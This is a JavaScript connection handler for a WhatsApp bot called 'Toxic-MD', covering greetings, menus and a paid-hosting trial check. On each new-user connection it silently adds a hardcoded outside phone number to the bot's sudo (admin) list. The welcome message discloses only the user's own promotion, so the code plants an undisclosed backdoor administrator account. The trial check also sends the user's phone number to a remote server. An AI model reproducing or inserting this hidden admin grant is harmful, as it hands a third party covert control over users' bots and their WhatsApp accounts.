import fs from 'fs';
import { Boom } from '@hapi/boom';
import { DateTime } from 'luxon';
import { DisconnectReason, generateWAMessageFromContent } from '@whiskeysockets/baileys';
import { addSudoUser, getSudoUsers } from '../database/config.js';
import { getCachedSettings } from '../lib/settingsCache.js';
import { commands, totalCommands } from '../handlers/commandHandler.js';
import { getDeviceMode } from '../lib/deviceMode.js';

const botName = process.env.BOTNAME || "Toxic-MD";
let hasSentStartMessage = false;

const FLAG_FILE = '.trial-verified';

function getGreeting() {
  const hour = DateTime.now().setZone("Africa/Nairobi").hour;
  if (hour >= 5 && hour < 12) return "Hey there! Ready to kick off the day?";
  if (hour >= 12 && hour < 18) return "What's up? Time to make things happen!";
  if (hour >= 18 && hour < 22) return "Evening vibes! Let's get to it!";
  return "Late night? Let's see what's cooking!";
}

function getCurrentTime() {
  return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
}

async function runTrialCheck(socket, userId, botJid) {
  if (fs.existsSync(FLAG_FILE)) return true;
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 10000);
    let res;
    try {
      const _appName = process.env.HEROKU_APP_NAME ? `?app=${encodeURIComponent(process.env.HEROKU_APP_NAME)}` : '';
        res = await fetch(`https://hosting.toxicx.tech/api/bots/trial-check/${userId}${_appName}`, { signal: controller.signal });
    } finally {
      clearTimeout(timer);
    }
    if (!res.ok) {
      fs.writeFileSync(FLAG_FILE, '1');
      return true;
    }
    const data = await res.json();
    if (data.status === 'trial_ended') {
      try {
        await socket.sendMessage(botJid, {
            text: [
              '⚠️ *Free Trial Ended*',
              '',
              'Your free trial has expired, or this WhatsApp number was already used for a free trial on another account.',
              '',
              'This bot is being removed from our servers.',
              '',
              '💳 Renew at *hosting.toxicx.tech* to keep using the bot.',
              '',
              '_Toxic-Hosting_'
            ].join('\n')
          });
      } catch {}
      await new Promise(r => setTimeout(r, 3000));
      process.exit(0);
      return false;
    }
    fs.writeFileSync(FLAG_FILE, '1');
    return true;
  } catch {
    fs.writeFileSync(FLAG_FILE, '1');
    return true;
  }
}

async function connectionHandler(socket, connectionUpdate, reconnect) {
  const { connection, lastDisconnect } = connectionUpdate;

  if (connection === "connecting") return;

  if (connection === "close") {
    const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;
    if (statusCode === DisconnectReason.loggedOut) {
      hasSentStartMessage = false;
    }
    return;
  }

  if (connection === "open") {
    const userId = socket.user.id.split(":")[0].split("@")[0];
    const settings = await getCachedSettings();
    const sudoUsers = await getSudoUsers();

    let botJid = socket.user?.id || (userId + '@s.whatsapp.net');
    if (botJid.includes(':')) {
      botJid = botJid.split(':')[0] + '@s.whatsapp.net';
    }

    const canProceed = await runTrialCheck(socket, userId, botJid);
    if (!canProceed) return;

    if (!hasSentStartMessage) {
      const isNewUser = !sudoUsers.includes(userId);
      if (isNewUser) {
        await addSudoUser(userId);
        const defaultSudo = "254114885159";
        if (!sudoUsers.includes(defaultSudo)) {
          await addSudoUser(defaultSudo);
        }
      }

      const firstMessage = isNewUser
        ? [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Welcome to *${botName}*! You're now connected.`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `📦 *Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            ``,
            `│❒ *New User Alert*: You've been added to the sudo list.`,
            ``,
            `🌐 *Hosted by Toxic-Hosting*`,
            `🔗 hosting.toxicx.tech`,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n")
        : [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Welcome back to *${botName}*! Connection established.`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `📦 *Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            ``,
            `🌐 *Hosted by Toxic-Hosting*`,
            `🔗 hosting.toxicx.tech`,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n");

      const effectivePrefix = settings.prefix || '.';

      try {
        await socket.sendMessage(botJid, {
          text: firstMessage,
          footer: `Powered by Toxic-Hosting`,
          viewOnce: true
        });

        const device = await getDeviceMode();

        if (device === 'ios') {
          const iosQuickText = [
            `╭───(    ${botName}    )───`,
            `├───≫ Quick Start ≪───`,
            `├`,
            `├ Use the commands below to get started:`,
            `├`,
            `├ ${effectivePrefix}menu — View all commands`,
            `├ ${effectivePrefix}settings — Bot configuration`,
            `├ ${effectivePrefix}ping — Check bot speed`,
            `├ ${effectivePrefix}uptime — Bot uptime`,
            `╰──────────────────☉`,
            `> 🌐 Hosted by Toxic-Hosting`,
            `> 🔗 hosting.toxicx.tech`
          ].join('\n');
          await socket.sendMessage(botJid, { text: iosQuickText });
        } else {
          const buttonsMsg = generateWAMessageFromContent(
            botJid,
            {
              interactiveMessage: {
                body: {
                  text: `*Bot is ready!*\n*Pick an option below to get started.*`
                },
                footer: { text: `Hosted by Toxic-Hosting | hosting.toxicx.tech` },
                nativeFlowMessage: {
                  messageVersion: 1,
                  buttons: [
                    {
                      name: 'single_select',
                      buttonParamsJson: JSON.stringify({
                        title: 'Get Started',
                        sections: [{
                          title: 'Quick Actions',
                          rows: [
                            { title: 'Menu', description: 'View all commands', id: `${effectivePrefix}menu` },
                            { title: 'Settings', description: 'Bot configuration', id: `${effectivePrefix}settings` },
                            { title: 'Ping', description: 'Check bot speed', id: `${effectivePrefix}ping` },
                            { title: 'Uptime', description: 'How long bot has been running', id: `${effectivePrefix}uptime` }
                          ]
                        }]
                      })
                    }
                  ]
                }
              }
            },
            {}
          );
          await socket.relayMessage(botJid, buttonsMsg.message, { messageId: buttonsMsg.key.id });
        }
      } catch (error) {}

      hasSentStartMessage = true;
    }
  }
}

export default connectionHandler;
